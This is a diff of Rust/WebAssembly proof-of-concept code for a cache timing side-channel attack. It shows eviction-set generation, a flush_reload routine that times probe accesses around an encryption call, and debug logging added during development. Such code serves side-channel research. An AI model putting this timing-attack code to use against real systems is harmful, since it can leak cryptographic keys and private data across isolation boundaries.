@@ -1,12 +1,10 @@
-use core::{hint::black_box, mem::ManuallyDrop};
-
-use alloc::{boxed::Box, collections::LinkedList, vec, vec::Vec};
+use alloc::{boxed::Box, vec, vec::Vec};
 
 use self::env::{random, timed_access, timed_hit};
 
 const CACHE_LINE_SIZE: usize = 64;
 const CACHE_ASSOCIATIVITY: usize = 12;
-const CACHE_L3_SIZE: usize = 6 * 1024;
+const BUFFER_SIZE: usize = 20 * 1024;
 
 mod env {
     mod unsafe_js {
@@ -62,22 +60,31 @@ fn wait(number_of_cycles: u32) {
     }
 }
 
+#[no_mangle]
 pub fn indices_to_raw_linked_list(indices: Vec<u32>) -> Vec<u32> {
-    let mut vec: Vec<u32> = vec![0; indices.len()];
-    let mut pointer = indices[0];
+    let mut vec: Vec<u32> = vec![0; BUFFER_SIZE / core::mem::size_of::<u32>()];
     let base_ptr = vec.as_ptr() as u32;
-    indices.iter().for_each(|i| {
-        vec[pointer as usize] = i + base_ptr;
-        pointer = *i;
-    });
+    env::log(base_ptr as u64);
+    let mut pointer = indices[0];
+    env::log(123123);
+    env::log(vec.len() as u64);
+    for i in 0..indices.len() {
+        env::log(pointer as u64);
+        vec[pointer as usize] = indices[i] + base_ptr;
+        env::log(i as u64);
+        pointer = indices[i];
+        env::log(i as u64);
+    }
     vec[pointer as usize] = 0x00;
     vec
 }
 
 #[no_mangle]
-pub fn generate_candidate_set(target: &[u8]) -> Vec<u32> {
-    let number_of_candidates = CACHE_L3_SIZE / CACHE_LINE_SIZE;
-    let mut candidates: Vec<u32> = (0..number_of_candidates).map(|i| i as u32).collect();
+pub fn generate_candidate_set() -> Vec<u32> {
+    let number_of_candidates = BUFFER_SIZE / CACHE_LINE_SIZE;
+    let mut candidates: Vec<u32> = (0..number_of_candidates)
+        .map(|i| (i * CACHE_LINE_SIZE) as u32)
+        .collect();
     (0..number_of_candidates).for_each(|i| {
         let random_index: usize = (env::random() * ((candidates.len() - 1) as f64)) as usize;
         candidates.swap(random_index, i);
@@ -129,21 +136,23 @@ pub extern "C" fn flush_reload(
     target_size: usize,
 ) -> Box<[u32]> {
     let target = unsafe { core::slice::from_raw_parts(target, target_size) };
+    let base_ptr: u32 = target.as_ptr() as u32;
     let probes = unsafe { core::slice::from_raw_parts(probes, probe_size) };
 
-    let candidate_set: Vec<u32> = generate_candidate_set(target);
+    let candidate_set: Vec<u32> = generate_candidate_set();
     let eviction_sets: Vec<Vec<u32>> = probes //config.probes
         .iter()
         .map(|offset| generate_eviction_set(*offset, &candidate_set, threshold as u64))
         .collect();
     env::encrypt();
-    env::log(123);
     let results: Vec<u32> = (0..time_slots)
         .flat_map(|_| {
             // access probes
             let start = env::get_time();
-            let time_slot_results: Vec<u32> =
-                probes.iter().map(|p| timed_access(*p) as u32).collect();
+            let time_slot_results: Vec<u32> = probes
+                .iter()
+                .map(|p| timed_access(*p + base_ptr) as u32)
+                .collect();
             // evict probes
             eviction_sets
                 .iter()
